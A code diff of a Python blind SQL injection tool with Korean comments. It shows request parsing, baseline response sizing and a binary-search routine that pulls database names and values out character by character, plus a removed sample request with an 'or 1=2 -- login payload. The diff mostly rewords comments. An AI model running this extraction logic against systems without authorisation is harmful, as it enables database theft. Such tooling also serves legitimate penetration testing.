@@ -204,18 +204,6 @@ class BlindSQLInjector:
         self.false_message_size = None  # 조건이 false 일 때 응답 크기
         self.db_manager = SQLiteProcessor(args.result_db)
         
-#         self.request_string = """
-# GET /?username='or+1=2+--+&password=1 HTTP/1.1
-# host: 192.168.219.100:5001
-# Upgrade-Insecure-Requests: 1
-# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
-# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-# Referer: http://192.168.219.100:5001/?username=&password=
-# Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
-# Connection: keep-alive
-
-# """
-
     def url_encode(self, item):
         """URL은 문자열을 인코딩"""
         return urllib.parse.quote(item)
@@ -235,43 +223,43 @@ class BlindSQLInjector:
 
     def parse_request(self, request):
         """HTTP 요청 구문 분석"""
-        headers = {}  # 헤더 사전
-        data = {}     # 매개 변수 사전
+        headers = {}  # 헤더 딕셔너리
+        data = {}     # 파라미터 딕셔너리
 
-        lines = request.split("\n")  # 라인으로 나뉩니다
-        method, path_param, http_ver = lines[1].split()  # 추출 방법, 경로 및 HTTP 버전
+        lines = request.split("\n")  # 한줄씩 쪼개서 넣기
+        method, path_param, http_ver = lines[1].split()  # POST /v1/groups/814a75c9-f187-48c8-8c01-a9805212db0e/files/details?AAA=aaa&BBB=bbb HTTP/2
 
-        if method == 'GET':  # 요청 요청
-            path, param_tmp = path_param.split("?")
+        if method == 'GET': # GET
+            path, param_tmp = path_param.split("?") # param = AAA=aaa&BBB=bb
             param = param_tmp
 
             for line in lines[2:]:
                 if ":" in line:
                     key, value = line.split(": ", 1)  # 콜론으로 값을 처리하기 위해 분할
                     key = key.lower()
-                    headers[key] = value
+                    headers[key] = value # 딕셔너리에 {헤더 : 값}
                     
             for get_param in param.split("&"):
                 key, value = get_param.split("=", 1)
-                data[key] = value
+                data[key] = value # 딕셔너리에 {파라미터 : 값}
                 
             url = headers['host']
             condition = self.url_decode(data[self.args.parameter])
 
-        else:  # 게시물 및 기타 방법
+        else:   # 이외 POST 등 일경우 body 값 파싱
             path = path_param.split("?", 1)[0]
             headers_string, data_string = request.split("\n\n", 1)
             
             for line in headers_string.split("\n"):
                 if ":" in line:
-                    key, value = line.split(": ", 1)  # 콜론으로 값
+                    key, value = line.split(": ", 1)  
                     headers[key.lower()] = value
                     
             url = headers['host']
 
             if headers.get('content-type') == 'application/json':
                 try:
-                    data = json.loads(data_string)  #JSON 바디를 구문 분석
+                    data = json.loads(data_string)  # JSON 파싱
                     condition = self.url_decode(data[self.args.parameter])
                 except json.JSONDecodeError:
                     print(f"{Colors.LIGHT_BLUE}[-] JSON parsing error occurred{Colors.END}")
@@ -295,7 +283,7 @@ class BlindSQLInjector:
         )
 
     def create_payloads(self):
-        """선택한 DBM 및 작동을 기반으로 SQL 분사 페이로드 생성"""
+        """페이로드 선택"""
         dbms = self.args.dbms.lower()
         payloads = {}
 
@@ -399,7 +387,7 @@ class BlindSQLInjector:
         return result_payload
 
     def establish_baseline(self, data):
-        """허위 조건에 대한 기준 응답 크기를 설정"""
+        """거짓 조건에 대한 기준 응답 크기를 설정"""
         method = data['method']
         url = data['url']
         path = data['path']
@@ -416,18 +404,15 @@ class BlindSQLInjector:
             if method == 'GET':
                 params = '&'.join([f"{key}={value}" for key, value in data_params.items()])
                 full_url = f"{self.args.schema}://{url}{path}?{params}"
-                response = requests.request(method, full_url, headers=headers, proxies=proxies, 
-                                          timeout=timeout, verify=False)
+                response = requests.request(method, full_url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
                 self.false_message_size = len(response.content)
                 
             else:  # 게시물 또는 기타 방법
                 full_url = f"{self.args.schema}://{url}{path}"
                 if headers.get('content-type') == 'application/json':
-                    response = requests.request(method, full_url, headers=headers, json=data_params, 
-                                              proxies=proxies, timeout=timeout, verify=False)
+                    response = requests.request(method, full_url, headers=headers, json=data_params, proxies=proxies, timeout=timeout, verify=False)
                 else:
-                    response = requests.request(method, full_url, headers=headers, data=data_params, 
-                                              proxies=proxies, timeout=timeout, verify=False)
+                    response = requests.request(method, full_url, headers=headers, data=data_params, proxies=proxies, timeout=timeout, verify=False)
                     
                 self.false_message_size = len(response.content)
                 
@@ -443,7 +428,7 @@ class BlindSQLInjector:
         headers = data_val['headers']
         data_params = data_val['data']
         
-        # get을 사용하는 경우 URL 인코딩 매개 변수
+        # GET을 사용하는 경우 URL 인코딩
         if method == 'GET':
             data_params[self.args.parameter] = self.url_encode(data_params[self.args.parameter])
         
@@ -458,14 +443,12 @@ class BlindSQLInjector:
                                           timeout=timeout, verify=False)
                 check_message_size = len(response.content)
                 
-            else:  # 게시물 또는 기타 방법
+            else: 
                 full_url = f"{self.args.schema}://{url}{path}"
                 if headers.get('content-type') == 'application/json':
-                    response = requests.request(method, full_url, headers=headers, json=data_params, 
-                                              proxies=proxies, timeout=timeout, verify=False)
+                    response = requests.request(method, full_url, headers=headers, json=data_params, proxies=proxies, timeout=timeout, verify=False)
                 else:
-                    response = requests.request(method, full_url, headers=headers, data=data_params, 
-                                              proxies=proxies, timeout=timeout, verify=False)
+                    response = requests.request(method, full_url, headers=headers, data=data_params, proxies=proxies, timeout=timeout, verify=False)
                     
                 check_message_size = len(response.content)
                 
@@ -476,9 +459,8 @@ class BlindSQLInjector:
             print(f"{Colors.LIGHT_BLUE}[-] Connection error: {e}{Colors.END}")
             return False
 
-    def binary_search(self, min_val, max_val, data_val, payload_fix, substr_index=None, rows_=None, 
-                     select_db=None, select_table=None, select_column=None):
-        """이진 검색을 수행하여 올바른 값을 찾으십시오"""
+    def binary_search(self, min_val, max_val, data_val, payload_fix, substr_index=None, rows_=None, select_db=None, select_table=None, select_column=None):
+        """이진 검색"""
         mid_val = int((min_val + max_val) / 2)
         
         # 현재 값으로 페이로드를 형식화
@@ -497,7 +479,7 @@ class BlindSQLInjector:
         # 요청을 보내고 결과를 얻습니다
         bin_result = self.send_request(data_val)
         
-        # 기본 케이스 -범위가 좁아지면 1
+        # 기본 케이스 - 범위가 좁아지면 1
         if max_val - min_val <= 1:
             return max_val if bin_result else min_val
         
@@ -511,13 +493,13 @@ class BlindSQLInjector:
 
     def execute_injection(self):
         # 구문 분석 요청 및 기준선 설정
-        normalized_request = self.normalize_request(REQUEST_STRING)
+        normalized_request = self.normalize_request(REQUEST_STRING) # 응답데이터 파싱
         data, condition = self.parse_request(normalized_request)
         self.establish_baseline(data)
         
        # 페이로드를 생성하고 사용자 정의
         payloads = self.create_payloads()
-        result_payload = self.customize_payloads(condition, payloads)
+        result_payload = self.customize_payloads(condition, payloads) # 조건식에서 1=2 을 페이로드로 리플레이스
         
         # 추출 테이블 준비 (열 옵션)
         select_tables = [None]  # -dbs 및 -테이블에 대한 기본값
@@ -551,18 +533,17 @@ class BlindSQLInjector:
             for rows in range(0, row_count):
                 for key, value in result_payload.items():
                     name_tmp.append(key)
-                    for key2, value2 in list(value.items())[1:]:  # 스킵 '카운트'키
+                    for key2, value2 in list(value.items())[1:]:  #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
                         if key2 == 'len':
                             # Oracle Rownum은 1에서 시작
-                            if self.args.dbms.lower() == 'oracle':
-                                rows += 1
+                            if self.args.dbms.lower() == 'oracle': # 오라클일 경우 rownum은 1부터 시작하기에 + 1 해야됨
+                                rows += 1 # 길이를 구하고 이름을 뽑고하는 방식이기 때문에 길이를 구할때만 +1하면됨
                             data_len = self.binary_search(0, 127, data, value2, None, rows, 
                                                         self.args.select_db, select_table_one, None)
                             print(f"[*] Length: {str(data_len)}")
                         else:
                             name_str = ""
-                            # 각 캐릭터를 추출
-                            for substr_index in range(0, data_len):
+                            for substr_index in range(0, data_len): # 데이터 글자 수 만큼 반복
                                 char_code = self.binary_search(0, 127, data, value2, substr_index + 1, rows, 
                                                              self.args.select_db, select_table_one, None)
                                 name_str += chr(char_code)
